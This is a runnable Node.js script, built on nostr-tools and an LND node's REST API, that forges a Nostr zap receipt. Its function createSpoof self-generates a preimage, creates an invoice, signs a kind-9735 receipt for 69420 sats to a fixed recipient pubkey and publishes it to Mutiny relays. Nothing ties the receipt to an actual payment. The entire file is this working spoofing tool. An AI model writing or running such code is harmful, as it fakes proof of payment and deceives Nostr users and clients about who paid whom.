const https = require('https');
const dotenv = require('dotenv');
const crypto = require('crypto');
const { finalizeEvent, Relay, useWebSocketImplementation } = require('nostr-tools');
const WebSocket = require('ws');

useWebSocketImplementation(WebSocket);

dotenv.config();

const preimage = crypto.randomBytes(32).toString('hex');
const hash = crypto.createHash('sha256').update(preimage).digest().toString('hex');

async function createInvoice(eventJson) {
    // Convert to base64 as required by LND
    const r_preimage_base64 = Buffer.from(preimage, 'hex').toString('base64');
    const r_hash_base64 = Buffer.from(hash, 'hex').toString('base64');

    //   description hash is the sha256 hash of the stringified eventJson object in base64
    const descriptionHash = crypto.createHash('sha256')
        .update(Buffer.from(JSON.stringify(eventJson)).toString('base64'))
        .digest()
        .toString('base64');

    console.log('Preimage: ', r_preimage_base64);
    console.log('Hash: ', r_hash_base64);

    const postData = JSON.stringify({
        value: 69420,
        r_preimage: r_preimage_base64,
        r_hash: r_hash_base64,
        description_hash: descriptionHash,
    });

    const options = {
        hostname: process.env.HOST,
        port: 443,
        path: '/v1/invoices',
        method: 'POST',
        headers: {
            'grpc-metadata-macaroon': process.env.MACAROON,
            'Content-Type': 'application/json'
        },
    };

    return new Promise((resolve, reject) => {
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => {
                data += chunk;
            });
            res.on('end', () => {
                console.log('Response: ', data);
                resolve(JSON.parse(data));
            });
        });

        req.on('error', (e) => {
            console.error(`Problem with request: ${e.message}`);
            reject(e);
        });

        req.write(postData);
        req.end();
    });
}

async function createZapRequest(senderPublicKey, recipientPublicKey, amount, relays, content = "") {
    const zapRequest = {
        kind: 9734,
        content,
        tags: [
            ["p", recipientPublicKey],
            ["relays", ...relays],
            ["amount", amount.toString()],
        ],
        created_at: Math.floor(Date.now() / 1000),
    };

    return await finalizeEvent(zapRequest, process.env.PRIVKEY);
}

async function createZapReceipt(invoice, zapRequest) {
    const zapReceipt = {
        kind: 9735,
        content: "",
        tags: [
            ["p", zapRequest.tags.find(t => t[0] === "p")[1]],
            ...(zapRequest.tags.find(t => t[0] === "a") ? [["a", zapRequest.tags.find(t => t[0] === "a")[1]]] : []),
            ["bolt11", invoice.payment_request],
            ["description", JSON.stringify(zapRequest)],
            ["preimage", preimage],
        ],
        created_at: Math.floor(Date.now() / 1000),
    };

    return await finalizeEvent(zapReceipt, process.env.PRIVKEY);
}

async function createSpoof(senderPublicKey, recipientPublicKey, amount, relays, content) {
    const zapRequest = await createZapRequest(senderPublicKey, recipientPublicKey, amount, relays, content);
    console.log("Zap request created:", zapRequest);

    const invoice = await createInvoice(zapRequest);
    console.log("Invoice created:", invoice);

    const zapReceipt = await createZapReceipt(invoice, zapRequest);
    console.log("Zap receipt created:", zapReceipt);

    const relay = await Relay.connect(relays[0]);
    await relay.publish(zapReceipt);
    relay.close();
}

createSpoof(process.env.PUBKEY, "f33c8a9617cb15f705fc70cd461cfd6eaf22f9e24c33eabad981648e5ec6f741", 69420, ["wss://nostr.mutinywallet.com", "wss://relay.mutinywallet.com"], "⚡");